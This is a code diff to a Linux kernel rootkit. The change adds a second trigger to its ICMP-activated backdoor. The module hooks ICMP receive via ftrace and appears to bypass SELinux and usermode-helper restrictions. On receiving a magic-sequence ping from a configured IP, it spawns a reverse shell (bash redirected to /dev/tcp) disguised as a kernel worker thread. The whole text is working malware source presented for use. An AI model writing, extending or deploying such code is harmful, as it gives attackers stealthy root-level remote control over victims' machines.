@@ -4,7 +4,9 @@
 #include "../ftrace/ftrace_helper.h"
 
 #define SRV_PORT "80"
+#define SRV_PORT2 "4445"
 #define ICMP_MAGIC_SEQ 1337
+#define ICMP_MAGIC_SEQ2 1338
 #define PROC_NAME "[kworker/0:1]"
 
 static asmlinkage int (*orig_icmp_rcv)(struct sk_buff *);
@@ -13,6 +15,8 @@ static asmlinkage ssize_t (*orig_sel_write_enforce)(struct file *, const char __
 
 struct revshell_work {
     struct work_struct work;
+    const char *ip;
+    const char *port;
 };
 
 static void *selinux_state_ptr = NULL;
@@ -91,6 +95,7 @@ notrace static int bypass_selinux_disable(void)
 
 notrace static void spawn_revshell(struct work_struct *work)
 {
+    struct revshell_work *rw = container_of(work, struct revshell_work, work);
     char cmd[768];
     static char *envp[] = {
         "HOME=/",
@@ -119,7 +124,7 @@ notrace static void spawn_revshell(struct work_struct *work)
              "kill -59 $PID 2>/dev/null; "
              "exec -a \"%s\" /bin/bash &>/dev/tcp/%s/%s 0>&1"
              "' 2>/dev/null &",
-             PROC_NAME, YOUR_SRV_IP, SRV_PORT);
+             PROC_NAME, rw->ip, rw->port);
     
     sub_info = call_usermodehelper_setup(argv[0], argv, envp,
                                         GFP_KERNEL, NULL, NULL, NULL);
@@ -128,41 +133,55 @@ notrace static void spawn_revshell(struct work_struct *work)
     
     disable_umh_bypass();
     
-    kfree(container_of(work, struct revshell_work, work));
+    kfree(rw);
 }
 
 notrace static asmlinkage int hook_icmp_rcv(struct sk_buff *skb)
 {
     struct iphdr *iph;
     struct icmphdr *icmph;
-    u32 trigger_ip;
+    u32 trigger_ip, trigger_ip2;
     struct revshell_work *rw;
-    
+
     if (!skb)
         goto out;
-        
+
     iph = ip_hdr(skb);
     if (!iph || iph->protocol != IPPROTO_ICMP)
         goto out;
-        
+
     icmph = icmp_hdr(skb);
     if (!icmph)
         goto out;
-        
-    if (!in4_pton(YOUR_SRV_IP, -1, (u8 *)&trigger_ip, -1, NULL))
-        goto out;
-        
-    if (iph->saddr == trigger_ip && 
+
+    if (in4_pton(YOUR_SRV_IP, -1, (u8 *)&trigger_ip, -1, NULL) &&
+        iph->saddr == trigger_ip &&
         icmph->type == ICMP_ECHO &&
         ntohs(icmph->un.echo.sequence) == ICMP_MAGIC_SEQ) {
-        
+
         rw = kmalloc(sizeof(*rw), GFP_ATOMIC);
         if (rw) {
+            rw->ip = YOUR_SRV_IP;
+            rw->port = SRV_PORT;
             INIT_WORK(&rw->work, spawn_revshell);
             schedule_work(&rw->work);
         }
     }
-    
+
+    if (in4_pton(YOUR_SRV_IP2, -1, (u8 *)&trigger_ip2, -1, NULL) &&
+        iph->saddr == trigger_ip2 &&
+        icmph->type == ICMP_ECHO &&
+        ntohs(icmph->un.echo.sequence) == ICMP_MAGIC_SEQ2) {
+
+        rw = kmalloc(sizeof(*rw), GFP_ATOMIC);
+        if (rw) {
+            rw->ip = YOUR_SRV_IP2;
+            rw->port = SRV_PORT2;
+            INIT_WORK(&rw->work, spawn_revshell);
+            schedule_work(&rw->work);
+        }
+    }
+
 out:
     return orig_icmp_rcv(skb);
 }
